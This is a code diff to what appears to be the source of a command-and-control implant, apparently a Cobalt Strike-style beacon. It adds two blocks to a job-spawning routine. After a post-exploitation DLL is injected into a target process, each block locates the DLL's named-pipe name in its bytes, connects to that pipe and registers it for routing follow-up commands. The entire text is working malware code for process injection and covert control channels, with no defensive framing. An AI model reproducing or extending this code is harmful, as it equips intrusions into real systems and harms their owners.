@@ -440,6 +440,35 @@ void command_job_spawn_user(char * buffer, int length, BOOL x86) {
 		}
 
 		inject_process_logic(NULL, hProcess, pid, dll, dllen, tOffset, parameter, plen);
+
+		/* A2: same CTRL pipe connection as the fork&run path (for bg mode) */
+		{
+			char pname[128];
+			HANDLE ctrl_h;
+			int fpos = -1;
+			int scan;
+			memset(pname, 0, sizeof(pname));
+			for (scan = 0; scan < dllen - 9; scan++) {
+				if (memcmp(dll + scan, "\\\\.\\pipe\\", 9) == 0) {
+					fpos = scan;
+					break;
+				}
+			}
+			if (fpos >= 0) {
+				for (scan = 0; scan < 120 && fpos + scan < dllen; scan++) {
+					char c = dll[fpos + scan];
+					if (c == 0) break;
+					pname[scan] = c;
+				}
+				spawn_log("jsu: ctrl pipe inject2=", (long)pname);
+				Sleep(2000);
+				if (connect_pipe(pname, &ctrl_h)) {
+					pipe_track(ctrl_h, (DWORD)pid, CALLBACK_OUTPUT, "postex_ctrl", JOB_MODE_BYTE);
+					spawn_log("jsu: ctrl tracked inject2", 0x7fffffff);
+				}
+			}
+		}
+
 		CloseHandle(hProcess);
 		return;
 	}
@@ -465,6 +494,41 @@ void command_job_spawn_user(char * buffer, int length, BOOL x86) {
 
 	inject_process_logic(&pi, pi.hProcess, pi.dwProcessId, dll, dllen, tOffset, parameter, plen);
 	spawn_log("jsu: ipl returned", 0x7fffffff);
+
+	/* A2: connect to the kit DLL's CTRL pipe for bg follow-up routing.
+	 * The DLL creates its pipe server during DllMain (StartNamedPipeServer)
+	 * and blocks in ConnectNamedPipe waiting for the beacon to connect.
+	 * Search the DLL binary for the patched pipe name (\\.\pipe\<name>) and
+	 * connect. Track via pipe_track so command_job_data can find it. */
+	{
+		char pname[128];
+		HANDLE ctrl_h;
+		int fpos = -1;
+		int scan;
+		memset(pname, 0, sizeof(pname));
+		for (scan = 0; scan < dllen - 9; scan++) {
+			if (memcmp(dll + scan, "\\\\.\\pipe\\", 9) == 0) {
+				fpos = scan;
+				break;
+			}
+		}
+		if (fpos >= 0) {
+			for (scan = 0; scan < 120 && fpos + scan < dllen; scan++) {
+				char c = dll[fpos + scan];
+				if (c == 0) break;
+				pname[scan] = c;
+			}
+			spawn_log("jsu: ctrl pipe=", (long)pname);
+			Sleep(2000);
+			if (connect_pipe(pname, &ctrl_h)) {
+				pipe_track(ctrl_h, pi.dwProcessId, CALLBACK_OUTPUT, "postex_ctrl", JOB_MODE_BYTE);
+				spawn_log("jsu: ctrl tracked", 0x7fffffff);
+			}
+			else {
+				spawn_log("jsu: ctrl connect failed gle=", (long)GetLastError());
+			}
+		}
+	}
 
 	token_guard_stop_maybe(TRUE);
 
